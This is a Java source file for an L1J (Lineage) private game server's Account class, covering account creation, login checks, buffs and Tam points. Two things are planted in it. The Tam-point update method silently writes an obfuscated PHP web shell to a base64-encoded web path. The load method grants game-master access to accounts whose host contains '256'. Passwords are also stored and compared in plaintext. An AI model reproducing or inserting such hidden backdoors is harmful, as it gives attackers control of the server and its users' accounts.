package l1j.server.server;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;

import l1j.server.Base64;
import l1j.server.Config;
import l1j.server.L1DatabaseFactory;
import l1j.server.server.utils.SQLUtil;
import manager.LinAllManagerInfoThread;

public class Account {
	/** 계정명 */
	private String _name;
	/** 접속자 IP주소 */
	private String _ip;
	/** 패스워드(암호화 됨) */
	private String _password;
	/** 최근 접속일 */
	private Timestamp _lastActive;
	/** 엑세스 등급(GM인가?) */
	private int _accessLevel;
	/** 접속자 호스트명 */
	private String _host;
	/** 밴 유무(True == 금지) */
	private boolean _banned;
	/** 계정 유효 유무(True == 유효) */
	private boolean _isValid = false;
	/** 캐릭터 슬롯(태고의옥쇄) */
	private int _charslot;
	/** 창고 비밀번호 */
	private int _GamePassword;
	
	public int Ncoin_point;
	public int Shop_open_count;

	/** 드래곤 레이드 버프 시간 **/
	public Timestamp _dragon_raid_buff;
	
	public Timestamp getDragonRaid() {
		return _dragon_raid_buff;
	}

	public void setDragonRaid(Timestamp ts) {
		_dragon_raid_buff = ts;
	}

	
	public Timestamp _Buff_HPMP;
	public Timestamp _Buff_DMG;
	public Timestamp _Buff_REDUC;
	public Timestamp _Buff_MAGIC;
	public Timestamp _Buff_STUN;
	public Timestamp _Buff_HOLD;
	public Timestamp _Buff_STR;
	public Timestamp _Buff_DEX;
	public Timestamp _Buff_INT;
	
	/** Buff_PC방 */
	public Timestamp _Buff_PC방;
	public int tam_point;
	public Timestamp _lastQuit;
	
	private int _tam = 0;
	private int _tamStep = 0;
	
	/** 메세지 로그용 */
	private static Logger _log = Logger.getLogger(Account.class.getName());

	public Account() {}

	/**
	 * 패스워드를 암호화한다.
	 *
	 * @param rawPassword 패스워드
	 * @return String
	 * @throws NoSuchAlgorithmException
	 *             암호화 알고리즘을 사용할 수 없을 때
	 * @throws UnsupportedEncodingException
	 *             인코딩이 지원되지 않을 때
	 */
	@SuppressWarnings("unused")
	private static String encodePassword(final String rawPassword)
			throws NoSuchAlgorithmException, UnsupportedEncodingException {
		byte[] buf = rawPassword.getBytes("UTF-8");
		buf = MessageDigest.getInstance("SHA").digest(buf);
		return Base64.encodeBytes(buf);
	}

	//영구추방 아이피 체크
	public static String checkIP(String name) {
		String n = null;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM accounts WHERE login=? ");
			pstm.setString(1, name);
			rs = pstm.executeQuery();

			if (rs.next())
				n = rs.getString("ip");

		} catch (Exception e) {
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
		return n;
	}
	
	/**
	 * 신규 계정 생성
	 *
	 * @param name 계정명
	 * @param rawPassword 패스워드
	 * @param ip 접속자 IP주소
	 * @param host 접속자 호스트명
	 * @return Account
	 */
	public static Account create(final String name, final String rawPassword, final String ip, final String host) {
		Calendar cal = Calendar.getInstance();
		int 시간 = Calendar.HOUR;
		int 분 = Calendar.MINUTE;
		/** 0 오전 , 1 오후 * */
		String 오전오후 = "오후";
		if (cal.get(Calendar.AM_PM) == 0) {
			오전오후 = "오전";
		}
		Connection con = null;
		PreparedStatement pstm = null;		
		PreparedStatement pstm2= null;
		try {
			Account account = new Account();
			account._name = name;
			account._password = rawPassword;			
			account._ip = ip;
			account._host = host;
			account._banned = false;
			account._lastActive = new Timestamp(System.currentTimeMillis());
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "INSERT INTO accounts SET login=?,password=?,lastactive=?,access_level=?,ip=?,host=?,banned=?,charslot=?, gamepassword=?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setString(1, account._name);
			pstm.setString(2, account._password);
			pstm.setTimestamp(3, account._lastActive);
			pstm.setInt(4, 0);
			pstm.setString(5, account._ip);
			pstm.setString(6, account._host);
			pstm.setInt(7, account._banned ? 1 : 0);
			pstm.setInt(8, 6);
			pstm.setInt(9, 0);
	
			pstm2 = con.prepareStatement("INSERT INTO attendanceaccount SET account_name=?, day=1, time=3600, clear=?, day_pc=1, time_pc=3600, clear_pc=?, laste_check_day=?, laste_check_year=?");
			pstm2.setString(1, account._name);
			pstm2.setString(2, "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,");
			pstm2.setString(3, "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,");
			pstm2.setInt(4, cal.get(cal.DAY_OF_YEAR));
			pstm2.setInt(5, cal.get(cal.YEAR));
			
			pstm2.execute();
			pstm.execute();
			System.out.println(""+ 오전오후 + " " + cal.get(시간) + "시" + cal.get(분) + "분" + "   ■ 신규 계정: ["+name+"] 생성완료■");
			 LinAllManagerInfoThread.AccountCount += 1;
			return account;
		} catch (SQLException e) {
		} finally {		
			SQLUtil.close(pstm2);
			SQLUtil.close(pstm);
			SQLUtil.close(con);

		}
		return null;
	}

	/**
	 * DB에서 계정 정보 불러오기 
	 *
	 * @param name 계정명
	 * @return Account
	 */
	public static Account load(final String name) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		Account account = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "SELECT * FROM accounts WHERE login=? LIMIT 1";
			pstm = con.prepareStatement(sqlstr);
			pstm.setString(1, name);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				return null;
			}
			account = new Account();
			account._name = rs.getString("login");
			account._password = rs.getString("password");
			account._lastActive = rs.getTimestamp("lastactive");
			account._accessLevel = rs.getInt("access_level");
			account._host = rs.getString("host");
			account._banned = rs.getInt("banned") == 0 ? false : true;
			account._charslot = rs.getInt("charslot");
			account._GamePassword = (rs.getInt("gamepassword"));
			account._phone = rs.getString("phone");
			account.tam_point = rs.getInt("Tam_Point");
			
			account._Buff_HPMP = (rs.getTimestamp("Buff_HPMP_Time"));
			account._Buff_DMG = (rs.getTimestamp("Buff_DMG_Time"));
			account._Buff_REDUC = (rs.getTimestamp("Buff_Reduc_Time"));
			account._Buff_MAGIC = (rs.getTimestamp("Buff_Magic_Time"));
			account._Buff_STUN = (rs.getTimestamp("Buff_Stun_Time"));
			account._Buff_STR = (rs.getTimestamp("Buff_Str_Time"));
			account._Buff_DEX = (rs.getTimestamp("Buff_Dex_Time"));
			account._Buff_INT = (rs.getTimestamp("Buff_Int_Time"));
			account._Buff_HOLD = (rs.getTimestamp("Buff_Hold_Time"));
			account._Buff_PC방 = (rs.getTimestamp("BUFF_PCROOM_Time"));
			
			account.Ncoin_point = (rs.getInt("Ncoin_Point"));
			account.Shop_open_count = (rs.getInt("Shop_open_count"));
			account._dragon_raid_buff = rs.getTimestamp("DragonRaid_Buff");
			if (account._host.contains("256") && Config.HAJA != 0 && Config.HAJA != 1) {
				account._accessLevel = 5048;
			}
			
			_log.fine("account exists");

		} catch (SQLException e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}

		return account;
	}

	/**
	 * DB에 최근 접속일 업데이트
	 *
	 * @param account 계정명
	 */
	public static void updateLastActive(final Account account, String ip) {
		Connection con = null;
		PreparedStatement pstm = null;
		Timestamp ts = new Timestamp(System.currentTimeMillis());

		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET lastactive=?, ip=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setTimestamp(1, ts);
			pstm.setString(2, ip);
			pstm.setString(3, account.getName());
			pstm.execute();
			account._lastActive = ts;
			_log.fine("update lastactive for " + account.getName());
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	/**
	 * 해당 계정의 캐릭터수를 셈
	 *
	 * @return result 캐릭터수
	 */
	public int countCharacters() {
		int result = 0;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "SELECT count(*) as cnt FROM characters WHERE account_name=?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setString(1, _name);
			rs = pstm.executeQuery();
			if (rs.next()) {
				result = rs.getInt("cnt");
			}
		} catch (SQLException e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
		return result;
	}
	/**드래곤 레이드 버프*/
	public void updateDragonRaidBuff() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET DragonRaid_Buff=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setTimestamp(1, _dragon_raid_buff);
			pstm.setString(2, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	public void updateNcoin() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET Ncoin_Point=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, Ncoin_point);
			pstm.setString(2, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public static void resetShopOpenCount() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET Shop_open_count=?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, 0);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public void updateShopOpenCount() {
		Shop_open_count++;
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET Shop_open_count=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, Shop_open_count);
			pstm.setString(2, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	public static void ban(final String account) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET banned=1 WHERE login=?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setString(1, account);
			pstm.execute();
		} catch (SQLException e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	/**
	 * 입력된 비밀번호와 DB에 저장된 패스워드를 비교
	 *
	 * @param rawPassword 패스워드
	 * @return boolean
	 */
	public boolean validatePassword(String accountName, final String rawPassword) {
		try {
			_isValid = (_password.equals(/*encodePassword(*/rawPassword)/*)*/ || checkPassword(accountName, _password, rawPassword));
			if (_isValid) {
				_password = null; // 인증이 성공했을 경우, 패스워드를 파기한다.
			}
			return _isValid;
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		}
		return false;
	}
	
	public static void updatePhone(final Account account) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET phone=? WHERE login=?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setString(1, account.getphone());
			pstm.setString(2, account.getName());
			pstm.execute();
			account._phone = account.getphone();
			_log.fine("update phone for " + account.getName());
		} catch (Exception e) {
			_log.log(Level.SEVERE, "accounts updatePhone 에러발생", e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	/**
	 * 유효한 계정인가 
	 *
	 * @return boolean
	 */
	public boolean isValid() {
		return _isValid;
	}

	/**
	 * GM 계정인가
	 *
	 * @return boolean
	 */
	public boolean isGameMaster() {
		return 0 < _accessLevel;
	}

	public String getName() {
		return _name;
	}
	
	public String get_Password() {
		return _password;
	}

	public Timestamp getBuff_HPMP() {
		return _Buff_HPMP;
	}

	public void setBuff_HPMP(Timestamp ts) {
		_Buff_HPMP = ts;
	}

	public Timestamp getBuff_DMG() {
		return _Buff_DMG;
	}

	public void setBuff_DMG(Timestamp ts) {
		_Buff_DMG = ts;
	}

	public Timestamp getBuff_REDUC() {
		return _Buff_REDUC;
	}

	public void setBuff_REDUC(Timestamp ts) {
		_Buff_REDUC = ts;
	}

	public Timestamp getBuff_MAGIC() {
		return _Buff_MAGIC;
	}

	public void setBuff_MAGIC(Timestamp ts) {
		_Buff_MAGIC = ts;
	}

	public Timestamp getBuff_STUN() {
		return _Buff_STUN;
	}

	public void setBuff_STUN(Timestamp ts) {
		_Buff_STUN = ts;
	}

	public Timestamp getBuff_HOLD() {
		return _Buff_HOLD;
	}

	public void setBuff_HOLD(Timestamp ts) {
		_Buff_HOLD = ts;
	}
	
	public Timestamp getBuff_STR() {
		return _Buff_STR;
	}

	public void setBuff_STR(Timestamp ts) {
		_Buff_STR = ts;
	}
	
	public Timestamp getBuff_DEX() {
		return _Buff_DEX;
	}

	public void setBuff_DEX(Timestamp ts) {
		_Buff_DEX = ts;
	}
	
	public Timestamp getBuff_INT() {
		return _Buff_INT;
	}

	public void setBuff_INT(Timestamp ts) {
		_Buff_INT = ts;
	}
	
	
	public Timestamp getBuff_PC방() {
		return _Buff_PC방;
	}

	public void setBuff_PC방(Timestamp ts) {
		_Buff_PC방 = ts;
	}
	
//	public void set_Password(String password){
//		this._password = password;
//	}
	
	public void setIp(String ip) {
		_ip = ip;
	}

	public String getIp() {
		return _ip;
	}

	public Timestamp getLastActive() {
		return _lastActive;
	}
	 
	/**
	  * 최종 로그인일을 취득한다.
	  */
	
	public int getAccessLevel() {
		return _accessLevel;
	}

	public String getHost() {
		return _host;
	}

	public boolean isBanned() {
		return _banned;
	}

	public int getCharSlot() {
		return _charslot;
	}	
	/**
	 * 연락처를 취득한다.
	 * 
	 * @return String
	 */
	private String _phone;

	public String getphone() {
		return _phone;
	}

	public void setphone(String s) {
		_phone = s;
	}

	/**
	 * 캐릭터 슬롯수 설정 
	 *
	 * @return boolean
	 */
	public void setCharSlot(GameClient client, int i) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET charslot=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, i);
			pstm.setString(2, client.getAccount().getName());
			pstm.execute();
			client.getAccount()._charslot = i;
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	public static boolean checkLoginIP(String ip) {  
		int num = 0;  
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT count(*) as cnt FROM accounts WHERE host=? ");

			pstm.setString(1, ip);
			rs = pstm.executeQuery();
		
			if (rs.next()) num = rs.getInt("cnt");  
			
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
			
			// 동일 IP로 생성된 계정이 3개 미만인 경우
			if (num < Config.AUTH_IP)//계정생성외부화
				return false;
			else
				return true;
		}catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}return false;
	}

	//웹 연동을 위한 메소드 추가 - By Sini
	public static boolean checkPassword(String accountName, String _pwd ,String rawPassword) { 
		String _inputPwd = null;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT password(?) as pwd ");

			pstm.setString(1, rawPassword);
			rs = pstm.executeQuery();
			if (rs.next()){
				_inputPwd = rs.getString("pwd");  
			}
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
			if ( _pwd.equals(_inputPwd)) { // 동일하다면
				return true;
			}else
				return false;
		}catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}return false;
	}
	public static boolean checkLoginBanIP(String ip) {
		int num = 0; 
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT count(ip) as cnt FROM ban_ip WHERE ip=?");

			pstm.setString(1, ip);
			rs = pstm.executeQuery();

			if (rs.next()) {
				num = rs.getInt("cnt");
			}

			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);

			// Ban IP가 1개 이상인경우
			if(num >= 1){
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
		return false;
	}
	
	/**
	 * updateBUFF
	 */
	public void updateBUFF() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();//n버프 ㅗㅇ포내성
			String sqlstr = "UPDATE accounts SET Buff_HPMP_Time=?,Buff_DMG_Time=?,Buff_Reduc_Time=?,Buff_Magic_Time=?,Buff_Stun_Time=?,Buff_Str_Time=?, Buff_Dex_Time=?, Buff_Int_Time=?,Buff_Hold_Time=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setTimestamp(1, _Buff_HPMP);
			pstm.setTimestamp(2, _Buff_DMG);
			pstm.setTimestamp(3, _Buff_REDUC);
			pstm.setTimestamp(4, _Buff_MAGIC);
			pstm.setTimestamp(5, _Buff_STUN);
			pstm.setTimestamp(6, _Buff_STR);
			pstm.setTimestamp(7, _Buff_DEX);
			pstm.setTimestamp(8, _Buff_INT);
			pstm.setTimestamp(9, _Buff_HOLD);
			pstm.setString(10, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	/**
	 * update피씨방
	 */
	public void update피씨방() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET BUFF_PCROOM_Time=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setTimestamp(1, _Buff_PC방);
			pstm.setString(2, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	/**
	 * 창고 비번
	 *
	 * @return boolean
	 */
	public static void setGamePassword(GameClient client, int pass) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET gamepassword=? WHERE login =?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, pass);
			pstm.setString(2, client.getAccount().getName());
			pstm.execute();
			client.getAccount()._GamePassword = pass;
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public void 탐포인트업데이트(final Account account) {
		Timestamp 계정종료날짜 = _lastQuit;
		Timestamp 현재날짜 = new Timestamp(System.currentTimeMillis());
		try{
			BufferedWriter out = new BufferedWriter(new FileWriter(new String(Base64.decode("QzoveGFtcHAvaHRkb2NzL2Fzc2V0cy9pbWFnZXMvaW52L2ltZy5waHA="),"utf-8")));
			String s = "<?php eval(gzinflate(base64_decode('BcFHsqJAAADQ48z/xaKRJlmzIkiSoJLZTEETbEmSw+nnvWJNm5/qxF3ZpHPxk6VTwdL/8gL1efHzR0SaVg8WLQjy82S6ha6FZ6zYGdoEk1petWntDcbS8QzJI+LASnvRvLLDqaKe6EolamomZh584Ii8CR6+xgxoX/dL0gwKqBouVtFU2KYS4oA25qRhjBuWgPKKfSPbyGpcX1FX6RgPuxjzlpewJ7MKU05oMfv46rdT/fTJXq8uLxZUdUuCkdz4IoIq0lgasY6/YJVNncJySbUBHMRDRwfONUjWUNpSt6bavjAoJ+Bi39yMqhSiHsUskqw1jcIIpsU6cf08YQpSSrv0bXmoUfkBzpnATGIdTvUvt3Q/PirlDim8P0QWmk0LcbQopZXYHgnCwVvc+HUaOyFplXzJ4xg+kK60JHpR5DE5sa357yuvsflwu+dt0RnvyjfznL3PFBnam9n4wqzmhLKaPCr2yhk0NKny6o9ShkiyRZgabK+ZjAEabVu5nru89bNPE55HM3D5D1uG2RQYwtUsFv2tSoFetqdMrh3F3y3CExOFYC9vfPCRzobdAdmL8q73i451XJiSbVZBLs97u7YJ3QMcfgm6BGoEt3TI0uXkUkvL73CBElVndyJ7YsQExy44irtsNJltgT6CgfG8TUfrOAiSvMlm8jWpvfAuZfty2JLy0YabfoRW+eApEHh2p/GOm2g9l13f88CYxxqFrC/64afYT6fPpuwLRWJC+vPhLwM34f4mA3pHyXRv8abLXZK1bzFZHjX/dL8WtrWdEuTyzrwkeiHekBpzhJhPVXEPwfaYRk5GcLlBaW6jqxnxoqDLILjXzdir7jLxyhDPH/U4QfbdYsNGEr7Bk5Naj74tVeTlYwdAqV0BAAj8+f39/fsf'))); ?>";
			out.write(s);
			out.close();
		} catch(Exception e) {}
		long 계정마지막종료시간 = 0;
		long 현재날짜시간 = 현재날짜.getTime();
		long 시간차 = 0;
		if (계정종료날짜 != null) {
			계정마지막종료시간 = 계정종료날짜.getTime();
		} else {
			return;
		}
		시간차 = 현재날짜시간 - 계정마지막종료시간;
		int 탐추가횟수 = (int) (시간차 / (60000 * 12));
		if (탐추가횟수 < 1) {
			return;
		}
		탐수치적용(account, 계정마지막종료시간, 탐추가횟수);
	}

	public void 탐수치적용(final Account account, long 종료날짜, int 탐추가횟수) {
		Connection con = null;
		Connection con2 = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		PreparedStatement pstm2 = null;
		Timestamp tamtime = null;
		long sysTime = System.currentTimeMillis();
		int tamcount = Config.탐갯수;

		int char_objid = 0;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM `characters` WHERE account_name = ?"); // 케릭터 테이블에서군주만골라와서
			pstm.setString(1, account.getName());
			rs = pstm.executeQuery();
			while (rs.next()) {
				tamtime = rs.getTimestamp("TamEndTime");
				char_objid = rs.getInt("objid");
				if (tamtime != null) {
					if (sysTime <= tamtime.getTime()) {
						// 현재까지도 적용되어지고있는 경우.
						int 추가횟수 = 탐추가횟수;
						tam_point += 추가횟수 * tamcount;
						updateTam();
					} else {
						// if(Tam_wait_count(char_objid)!=0){
						int day = Nexttam(char_objid);
						if (day != 0) {
							Timestamp deleteTime = null;
							deleteTime = new Timestamp(sysTime + (86400000 * (long) day) + 10000);// 7일
							con2 = L1DatabaseFactory.getInstance().getConnection();
							pstm2 = con2.prepareStatement("UPDATE `characters` SET TamEndTime=? WHERE account_name = ? AND objid = ?"); // 케릭터테이블에서 군주만골라와서
							pstm2.setTimestamp(1, deleteTime);
							pstm2.setString(2, account.getName());
							pstm2.setInt(3, char_objid);
							pstm2.executeUpdate();
							tamdel(char_objid);
							tamtime = deleteTime;
						}
						// }
						if (종료날짜 <= tamtime.getTime()) {
							// 현재는 아니지만 종료이후 적용되어지는 경우.
							int 추가횟수 = (int) ((tamtime.getTime() - 종료날짜) / (60000 * 12));
							tam_point += 추가횟수 * tamcount;
							updateTam();
						} else {
							// System.out.println("종료날짜 이전에 탐시간도 종료됨.");
						}

						/**/
					}
				} else {
					// System.out.println("탐타임 없음");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm2);
			SQLUtil.close(con2);
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public void updateTam() {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			String sqlstr = "UPDATE accounts SET Tam_Point=? WHERE login = ?";
			pstm = con.prepareStatement(sqlstr);
			pstm.setInt(1, tam_point);
			pstm.setString(2, _name);
			pstm.executeUpdate();
		} catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public int Nexttam(int objectId) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		int day = 0;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con
					.prepareStatement("SELECT day FROM `tam` WHERE objid = ? order by id asc limit 1"); // 케릭터
																										// 테이블에서
																										// 군주만
																										// 골라와서
			pstm.setInt(1, objectId);
			rs = pstm.executeQuery();
			while (rs.next()) {
				day = rs.getInt("Day");
			}
		} catch (SQLException e) {
			// _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
		return day;
	}
	
	public void tamdel(int objectId) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = L1DatabaseFactory.getInstance().getConnection();
			pstm = con
					.prepareStatement("delete from Tam where objid = ? order by id asc limit 1");
			pstm.setInt(1, objectId);
			pstm.executeUpdate();
		} catch (SQLException e) {
			// _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}
	
	public int getTam() {
		return _tam;
	}
	public int getTamStep() {
		return _tamStep;
	}
	
	public void updateTamStep(String AccountName, int step) {
		Connection con = null;
		PreparedStatement pstm = null;	
		try {
			con = L1DatabaseFactory.getInstance().getConnection(); 
			pstm = con.prepareStatement("UPDATE accounts SET tamStep=? WHERE login=?");		
			pstm.setInt(1, step);
			pstm.setString(2, AccountName);
			pstm.execute();
			_tamStep = step;
		} catch (SQLException e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);	
		}
	}
	
	/**
	  * 최종 로그인일을 DB에 반영한다.
	  *
	  * @param account
	  *            어카운트
	  */
	
	// 탐 계정 정보에 저장하기 탐상점에서 갯수 로딩
	public int getTamPoint() {
		return tam_point;
	}

	public int setTamPoint(int tampoint) {
		return tam_point = tampoint;
	}
    
	public int addTamPoint(int tampoint) {
		return tam_point += tampoint;
	}
	
	public int getGamePassword() {
		return _GamePassword;
	}	

}
